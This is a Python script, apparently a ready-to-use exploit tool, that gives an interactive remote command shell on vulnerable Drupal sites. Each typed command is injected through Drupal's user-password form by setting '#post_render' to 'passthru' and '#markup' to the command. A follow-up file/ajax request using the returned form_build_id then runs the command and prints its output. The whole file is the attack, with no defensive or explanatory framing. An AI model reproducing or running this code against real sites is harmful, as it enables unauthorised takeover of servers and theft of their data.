#!/usr/bin/env python3
import requests
import re
import os
os.system("clear")
a='''
  \033[31m                                      
  _ _ __ _  _      ____  _ _ _ _   _  _ __  
 | '_/ __/ _ \ \ \ /\ / / _ \/ _` | ' \ / _ \| '_ \ 
 | | | (|  __/  \ V  V /  __/ (_| | |) | (_) | | | |
 |_|  \___\___|   \_/\_/ \___|\__,_| .__/ \___/|_| |_|
  ___ /\/|_____ ___  ______  | |     __         
 |_   |/\// ____|  _ \|  ____\ \ |_|    / /         
   | |    | |    | |__) | |__   \ \  /\  / /          
   | |    | |    |  _  /|  __|   \ \/  \/ /           
  | |   | |____| | \ \| |____   \  /\  /            
 |_____|   \_____|_|  \_\______|   \/  \/             
\033[33m
               BY 5H311_1NJ3C706   \033[32m                                                   
'''
print(a)
HOST= input("site name?: ")
while(1):
    cmd = input("$ ")
    if(cmd=='exit'):
        exit(1)
    get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]':cmd, 'name[#type]':'markup'}
    post_params = {'form_id':'user_pass', '_triggering_element_name':'name'}
    r = requests.post(HOST, data=post_params, params=get_params)

    m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
    if m:
        found = m.group(1)
        get_params = {'q':'file/ajax/name/#value/' + found}
        post_params = {'form_build_id':found}
        r = requests.post(HOST, data=post_params, params=get_params)
        print(r.text)